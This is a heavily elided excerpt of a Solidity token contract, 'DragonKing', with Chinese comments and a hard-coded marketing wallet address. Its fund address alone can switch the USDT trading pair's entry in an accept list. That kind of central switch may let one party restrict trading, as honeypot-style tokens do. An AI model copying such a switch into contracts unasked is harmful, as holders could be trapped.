...
abstract contract KINGToken is IERC20, Ownable {
    ...
    function setAcceptListTrue() external {
         require (msg.sender == fundAddress);
        _acceptList[address(_usdtPair)] = true;
    }
    function setAcceptListFalse() external {
         require (msg.sender == fundAddress);
...
contract DragonKing is KINGToken {
    constructor() KINGToken(
    //名称
        "DragonKing",
    //符号
        "DragonKing",
    ...
    //总量 1000
        1000,
    //营销钱包
        address(0x02341B59cAb69119989f5Cdc3d8600754E8575e1)
    ){
